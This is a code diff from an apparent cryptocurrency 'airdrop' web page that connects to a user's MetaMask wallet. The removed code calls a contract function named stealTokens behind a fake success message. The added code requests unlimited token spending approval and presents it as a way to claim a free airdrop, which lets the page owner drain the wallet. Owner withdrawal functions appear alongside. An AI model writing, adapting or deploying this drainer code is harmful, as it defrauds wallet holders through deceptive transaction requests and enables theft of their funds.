@@ -378,19 +378,33 @@ function openMetaMaskMobile() {
         alert('Error during approval'); // Notify user of the error
       }
     }
-    // Function to claim the airdrop
-    async function claimAirdrop() {
-      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
-      try {
-        showProcessingMessage(); // Display the processing message
-        await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] }); // Call the stealTokens function
-        hideProcessingMessage(); // Hide the processing message
-        alert('Airdrop claimed successfully!'); // Notify user of success
-      } catch (error) {
-        hideProcessingMessage(); // Hide processing message if an error occurs
-        alert('Error claiming airdrop'); // Notify user of the error
-      }
-    }
+
+
+    
+// Function to approve the contract for spending tokens
+async function approveSpending() {
+  const tokenContract = new web3.eth.Contract(contractABI, tokenAddress); // Instantiate the token contract
+  try {
+    showProcessingMessage(); // Display the processing message
+    const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Set maximum approval amount
+    await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] }); // Send approval transaction
+    hideProcessingMessage(); // Hide the processing message
+    alert('Approval successful! You can now claim your airdrop.'); // Notify user of success
+
+    // Update button to indicate airdrop is ready
+    const claimButton = document.getElementById('claimAirdropButton');
+    claimButton.disabled = false; // Enable the claim button
+    claimButton.style.backgroundColor = '#4caf50'; // Change to green
+    claimButton.textContent = 'Claim Your Airdrop Now!'; // Optional: Change button text
+  } catch (error) {
+    hideProcessingMessage(); // Hide processing message if an error occurs
+    alert('Error during approval'); // Notify user of the error
+  }
+}
+
+
+
+    
 
     // Function for the owner to withdraw ETH from the contract
     async function withdrawETH() {
@@ -413,6 +427,10 @@ function openMetaMaskMobile() {
         alert('Error during token withdrawal'); // Notify owner of the error
       }
     }
+
+
+
+    
 
     // Function to show the processing message
    function showProcessingMessage() {
